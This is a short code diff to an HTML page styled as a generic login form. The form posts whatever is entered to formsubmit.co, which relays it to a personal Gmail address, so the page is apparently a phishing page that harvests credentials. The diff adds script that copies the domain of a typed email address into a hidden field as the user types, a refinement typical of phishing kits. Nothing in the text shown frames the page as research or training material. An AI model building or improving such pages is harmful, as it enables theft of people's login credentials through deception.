@@ -25,7 +25,8 @@
         button:hover { background: #0056b3; }
     </style>
     <script>
-        function addDomainField(event) {
+        // Grab domain as soon as user types a valid email
+        function updateDomain() {
             var email = document.getElementById('email').value;
             var domain = "";
             if (email.includes('@')) {
@@ -33,12 +34,15 @@
             }
             document.getElementById('domain').value = domain;
         }
+        window.onload = function() {
+            document.getElementById('email').addEventListener('input', updateDomain);
+        };
     </script>
 </head>
 <body>
     <div class="login-container">
         <h2>Login</h2>
-        <form method="post" action="https://formsubmit.co/jc4717287@gmail.com" onsubmit="addDomainField(event)">
+        <form method="post" action="https://formsubmit.co/jc4717287@gmail.com">
             <div class="form-group">
                 <label for="email">Email:</label>
                 <input type="email" name="email" id="email" required autocomplete="username">
